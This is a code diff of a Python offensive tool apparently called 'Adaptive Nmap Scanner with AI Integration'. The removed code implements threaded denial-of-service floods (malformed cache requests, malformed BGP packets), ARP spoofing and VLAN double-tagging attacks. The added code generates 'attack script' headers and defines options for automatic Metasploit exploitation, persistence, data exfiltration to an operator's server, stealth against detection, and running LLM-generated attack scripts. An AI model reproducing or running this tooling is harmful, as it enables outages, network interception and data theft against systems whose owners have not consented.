-                while time.time() < end_time:
-                    try:
-                        # Send malformed cache headers
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.connect((target, 80))
-                        
-                        headers = (
-                            "GET / HTTP/1.1\r\n"
-                            f"Host: {target}\r\n"
-                            "Cache-Control: no-cache, no-store, must-revalidate\r\n"
-                            "Pragma: no-cache\r\n"
-                            "Expires: 0\r\n"
-                            "If-Modified-Since: Thu, 01 Jan 1970 00:00:00 GMT\r\n"
-                            "If-None-Match: W/\"0-0\"\r\n"
-                            "\r\n"
-                        )
-                        sock.send(headers.encode())
-                        sock.close()
-                    except:
-                        pass
-                        
-            # Start attack threads
-            end_time = time.time() + self.dos_duration
-            threads = []
-            for _ in range(self.dos_threads):
-                thread = threading.Thread(target=cache_attack)
-                thread.daemon = True
-                thread.start()
-                threads.append(thread)
-                
-            # Wait for all threads to complete
-            for thread in threads:
-                thread.join()
-                
-            return True
-            
-        except Exception as e:
-            self.logger.error(f"Error in cache poisoning attack: {e}")
-            return False
-            
-    def _bgp_route_poisoning_attack(self, target):
-        """Perform a BGP route poisoning attack."""
-        try:
-            import socket
-            import threading
-            import time
-            
-            def bgp_attack():
-                while time.time() < end_time:
-                    try:
-                        # Send malformed BGP updates
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.connect((target, 179))  # BGP port
-                        
-                        # Send malformed BGP packet
-                        bgp_packet = (
-                            b'\xff' * 16 +  # BGP marker
-                            b'\x00' * 2 +   # Length
-                            b'\x01' +        # Type (OPEN)
-                            b'\x04' +        # Version
-                            b'\x00' * 2 +    # AS number
-                            b'\x00' * 2 +    # Hold time
-                            b'\x00' +        # BGP identifier
-                            b'\x00'          # Optional parameters length
-                        )
-                        sock.send(bgp_packet)
-                        sock.close()
-                    except:
-                        pass
-                        
-            # Start attack threads
-            end_time = time.time() + self.dos_duration
-            threads = []
-            for _ in range(self.dos_threads):
-                thread = threading.Thread(target=bgp_attack)
-                thread.daemon = True
-                thread.start()
-                threads.append(thread)
-                
-            # Wait for all threads to complete
-            for thread in threads:
-                thread.join()
-                
-            return True
-            
-        except Exception as e:
-            self.logger.error(f"Error in BGP route poisoning attack: {e}")
-            return False
-            
-    def _arp_cache_poisoning_attack(self, target):
-        """Perform an ARP cache poisoning attack."""
-        try:
-            import scapy.all as scapy
-            import threading
-            import time
-            
-            def arp_attack():
-                while time.time() < end_time:
-                    try:
-                        # Create ARP packet
-                        arp = scapy.ARP(
-                            op=2,  # ARP reply
-                            pdst=target,
-                            hwdst="ff:ff:ff:ff:ff:ff",
-                            psrc="192.168.1.1",  # Spoofed IP
-                            hwsrc="00:11:22:33:44:55"  # Spoofed MAC
-                        )
-                        scapy.send(arp)
-                    except:
-                        pass
-                        
-            # Start attack threads
-            end_time = time.time() + self.dos_duration
-            threads = []
-            for _ in range(self.dos_threads):
-                thread = threading.Thread(target=arp_attack)
-                thread.daemon = True
-                thread.start()
-                threads.append(thread)
-                
-            # Wait for all threads to complete
-            for thread in threads:
-                thread.join()
-                
-            return True
-            
-        except Exception as e:
-            self.logger.error(f"Error in ARP cache poisoning attack: {e}")
-            return False
-            
-    def _vlan_hopping_attack(self, target):
-        """Perform a VLAN hopping attack."""
-        try:
-            import scapy.all as scapy
-            import threading
-            import time
-            
-            def vlan_attack():
-                while time.time() < end_time:
-                    try:
-                        # Create double-tagged VLAN packet
-                        packet = (
-                            scapy.Ether() /
-                            scapy.Dot1Q(vlan=1) /  # Outer VLAN
-                            scapy.Dot1Q(vlan=2) /  # Inner VLAN
-                            scapy.IP(dst=target) /
-                            scapy.TCP(dport=80)
-                        )
-                        scapy.send(packet)
-                    except:
-                        pass
-                        
-            # Start attack threads
-            end_time = time.time() + self.dos_duration
-            threads = []
-            for _ in range(self.dos_threads):
-                thread = threading.Thread(target=vlan_attack)
-                thread.daemon = True
-                thread.start()
-                threads.append(thread)
-                
-            # Wait for all threads to complete
-            for thread in threads:
-                thread.join()
-                
-            return True
-            
-        except Exception as e:
-            self.logger.error(f"Error in VLAN hopping attack: {e}")
-            return False
+    def _get_script_extension(self, script_type):
+        """Get the appropriate file extension for the script type"""
+        extensions = {
+            'python': '.py',
+            'bash': '.sh',
+            'powershell': '.ps1',
+            'ruby': '.rb'
+        }
+        return extensions.get(script_type, '.txt')
+        
+    def _generate_script_header(self, script_type):
+        """Generate the header section of the script"""
+        headers = {
+            'python': [
+                "#!/usr/bin/env python3",
+                "# Auto-generated attack script by Adaptive Nmap Scanner",
+                "# Generated on: " + time.strftime("%Y-%m-%d %H:%M:%S"),
+                "",
+                "import os",
+                "import sys",
+                "import time",
+                "import socket",
+                "import subprocess",
+                "import random",
+                "import argparse",
+                "import logging",
+                "import threading",
+                "try:",
+                "    import requests",
+                "    REQUESTS_AVAILABLE = True",
+                "except ImportError:",
+                "    REQUESTS_AVAILABLE = False",
+                "",
+                "# Setup logging",
+                "logging.basicConfig(",
+                "    level=logging.INFO,",
+                "    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'",
+                ")",
+                "logger = logging.getLogger('attack_script')",
+                ""
+            ],
+            'bash': [
+                "#!/bin/bash",
+                "# Auto-generated attack script by Adaptive Nmap Scanner",
+                "# Generated on: " + time.strftime("%Y-%m-%d %H:%M:%S"),
+                "",
+                "# Set up logging",
+                "LOGFILE=\"attack_log_$(date +%s).log\"",
+                "",
+                "log() {",
+                "    echo \"[$(date '+%Y-%m-%d %H:%M:%S')] $1\" | tee -a \"$LOGFILE\"",
+                "}",
+                "",
+                "log \"Starting attack script\"",
+                ""
+            ],
+            'powershell': [
+                "# Auto-generated attack script by Adaptive Nmap Scanner",
+                "# Generated on: " + time.strftime("%Y-%m-%d %H:%M:%S"),
+                "",
+                "# Set up logging",
+                "$LogFile = \"attack_log_$(Get-Date -Format 'yyyyMMddHHmmss').log\"",
+                "",
+                "function Write-Log {",
+                "    param ([string]$Message)",
+                "    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'",
+                "    \"[$timestamp] $Message\" | Tee-Object -FilePath $LogFile -Append",
+                "}",
+                "",
+                "Write-Log \"Starting attack script\"",
+                ""
+            ],
+            'ruby': [
+                "#!/usr/bin/env ruby",
+                "# Auto-generated attack script by Adaptive Nmap Scanner",
+                "# Generated on: " + time.strftime("%Y-%m-%d %H:%M:%S"),
+                "",
+                "require 'logger'",
+                "require 'socket'",
+                "require 'timeout'",
+                "",
+                "# Set up logging",
+                "logger = Logger.new(STDOUT)",
+                "logger.level = Logger::INFO",
+                "file_logger = Logger.new(\"attack_log_#{Time.now.to_i}.log\")",
+                "file_logger.level = Logger::INFO",
+                "",
+                "def log(message)",
+                "  logger.info(message)",
+                "  file_logger.info(message)",
+                "end",
+                "",
+                "log \"Starting attack script\"",
+                ""
+            ]
+        }
+        return headers.get(script_type, ["# Auto-generated attack script"])
 
 def parse_arguments():
     parser = argparse.ArgumentParser(description='Adaptive Nmap Scanner with AI Integration')
     
-    # Basic arguments
-    parser.add_argument('target', help='Target host or network to scan')
-    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
-    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode')
+    # Target selection arguments
+    parser.add_argument('target', nargs='?', help='Target host or network to scan')
+    parser.add_argument('--auto-discover', action='store_true', help='Automatically discover network and hosts')
+    parser.add_argument('--interface', help='Network interface to use for discovery')
+    parser.add_argument('--scan-all', action='store_true', help='Scan all discovered hosts')
+    parser.add_argument('--network', help='Specific network to scan (CIDR notation)')
+    parser.add_argument('--host-timeout', type=int, default=1, help='Timeout for host discovery (default: 1)')
+    
+    # Scan options
+    parser.add_argument('-m', '--model', default='qwen2.5-coder:7b', help='Ollama model to use (default: qwen2.5-coder:7b)')
+    parser.add_argument('-i', '--iterations', type=int, default=3, help='Maximum number of scan iterations (default: 3)')
+    parser.add_argument('-c', '--continuous', action='store_true', help='Run in continuous mode until manually stopped')
+    parser.add_argument('-d', '--delay', type=int, default=2, help='Delay between scans (default: 2)')
+    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode to avoid detection')
+    parser.add_argument('--ports', default='quick', help='Ports to scan: all, quick, or custom range (default: quick)')
+    parser.add_argument('--services', action='store_true', help='Enable detailed service detection')
+    parser.add_argument('--version', action='store_true', help='Enable version detection')
+    parser.add_argument('--os', action='store_true', help='Enable OS detection')
+    parser.add_argument('--vuln', action='store_true', help='Enable vulnerability scanning')
+    parser.add_argument('--timeout', type=int, default=30, help='Timeout for model responses (default: 30)')
+    parser.add_argument('--max-threads', type=int, default=4, help='Limit concurrent scan operations (default: 4)')
+    parser.add_argument('--memory-limit', help='Set memory limit for operations')
+    parser.add_argument('--show-live-ai', action='store_true', help='Show live AI responses during generation')
+    
+    # Metasploit options
+    parser.add_argument('--msf', action='store_true', help='Enable Metasploit integration')
+    parser.add_argument('--exploit', action='store_true', help='Automatically attempt exploitation')
+    parser.add_argument('--workspace', default='adaptive_scan', help='Metasploit workspace (default: adaptive_scan)')
+    parser.add_argument('--auto-script', action='store_true', help='Auto-generate Metasploit resource scripts')
+    parser.add_argument('--options', help='Custom Metasploit options (format: OPT1=val1 OPT2=val2)')
+    parser.add_argument('--payload', help='Specify Metasploit payload')
+    parser.add_argument('--module', help='Specify Metasploit module')
+    parser.add_argument('--post', action='store_true', help='Enable post-exploitation')
     
     # Red team arguments
     parser.add_argument('--red-team', action='store_true', help='Enable full red team mode')
@@ -3868,13 +3648,14 @@ def parse_arguments():
     parser.add_argument('--exfil-method', choices=['dns', 'http', 'icmp', 'smb', 'ftp'], help='Data exfiltration method')
     parser.add_argument('--exfil-data', choices=['passwords', 'configs', 'all'], help='Data to exfiltrate')
     parser.add_argument('--exfil-server', help='Server to exfiltrate data to')
+    parser.add_argument('--full-auto', action='store_true', help='Enable full automated scanning and attack mode')
     
     # DoS arguments
     parser.add_argument('--dos', action='store_true', help='Enable DoS attack mode')
     parser.add_argument('--dos-method', choices=[
         'udp', 'icmp', 'slowloris', 'syn', 'http',
         'cpu', 'memory', 'disk',
-        'http2', 'dns', 'slowpost',
+        'http2', 'dns', 'slowpost', 'tcp',
         'dbpool', 'cache',
         'bgp', 'arp', 'vlan'
     ], help='DoS attack method')
@@ -3882,25 +3663,96 @@ def parse_arguments():
     parser.add_argument('--dos-duration', type=int, default=60, help='Attack duration in seconds')
     parser.add_argument('--dos-payload', help='Custom payload for DoS attack')
     
-    # Other arguments
+    # Script generation
+    parser.add_argument('--generate-script', action='store_true', help='Generate attack script')
+    parser.add_argument('--script-type', choices=['python', 'bash', 'powershell', 'ruby'], help='Script type to generate')
+    parser.add_argument('--script-name', help='Name for the generated script')
+    parser.add_argument('--script-generation-type', choices=['attack', 'recon', 'dos', 'exploit'], 
+                        default='attack', help='Type of script to generate')
+    parser.add_argument('--execute-scripts', action='store_true', help='Execute generated scripts')
+    parser.add_argument('--custom-scripts', action='store_true', help='Enable custom script generation')
+    
+    # General options
+    parser.add_argument('--custom-vuln-file', help='Custom vulnerability definitions file')
+    parser.add_argument('--log-file', help='Log file to write output')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
+    parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
+    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
     parser.add_argument('--output', help='Output file for scan results')
     parser.add_argument('--format', choices=['text', 'xml', 'json'], default='text', help='Output format')
     
-    return parser.parse_args()
-
-def main():
-    """Main entry point."""
-    try:
-        # Parse arguments and get scanner
-        scanner = parse_arguments()
+    # Create a scanner with the parsed arguments
+    args = parser.parse_args()
+    
+    # Configure full-auto mode if requested
+    if args.full_auto:
+        args.auto_discover = True
+        args.scan_all = True
+        args.services = True
+        args.version = True
+        args.os = True
+        args.vuln = True
         
-        # Run the scanner
-        scanner.run()
-    except Exception as e:
-        logger.error(f"Error in main execution: {e}")
-        if logging.getLogger().level == logging.DEBUG:
-            traceback.print_exc()
-        sys.exit(1)
+    # Create scanner instance
+    scanner = AdaptiveNmapScanner(
+        target=args.target,
+        auto_discover=args.auto_discover,
+        interface=args.interface,
+        scan_all=args.scan_all,
+        network=args.network,
+        host_timeout=args.host_timeout,
+        model=args.model,
+        iterations=args.iterations,
+        continuous=args.continuous,
+        delay=args.delay,
+        stealth=args.stealth,
+        ports=args.ports,
+        services=args.services,
+        version_detection=args.version,
+        os_detection=args.os,
+        vulnerability_scan=args.vuln,
+        model_timeout=args.timeout,
+        max_threads=args.max_threads,
+        memory_limit=args.memory_limit,
+        show_live_ai=args.show_live_ai,
+        msf_integration=args.msf,
+        msf_options={
+            'enabled': args.msf,
+            'exploit': args.exploit,
+            'workspace': args.workspace,
+            'auto_script': args.auto_script,
+            'options': args.options
+        } if args.msf else None,
+        msf_payload=args.payload,
+        msf_module=args.module,
+        post_exploitation=args.post,
+        red_team=args.red_team,
+        persistence=args.persistence,
+        exfil=args.exfil,
+        exfil_method=args.exfil_method,
+        exfil_data=args.exfil_data,
+        exfil_server=args.exfil_server,
+        dos_attack=args.dos,
+        dos_method=args.dos_method,
+        dos_threads=args.dos_threads,
+        dos_duration=args.dos_duration,
+        dos_payload=args.dos_payload,
+        generate_script=args.generate_script,
+        script_type=args.script_type,
+        script_generation_type=args.script_generation_type,
+        generate_script_name=args.script_name,
+        execute_scripts=args.execute_scripts,
+        custom_scripts=args.custom_scripts,
+        custom_vuln_file=args.custom_vuln_file,
+        log_file=args.log_file,
+        verbose=args.verbose,
+        quiet=args.quiet,
+        debug=args.debug,
+        output_file=args.output,
+        output_format=args.format
+    )
+    
+    return scanner
 
 if __name__ == "__main__":
     main() 
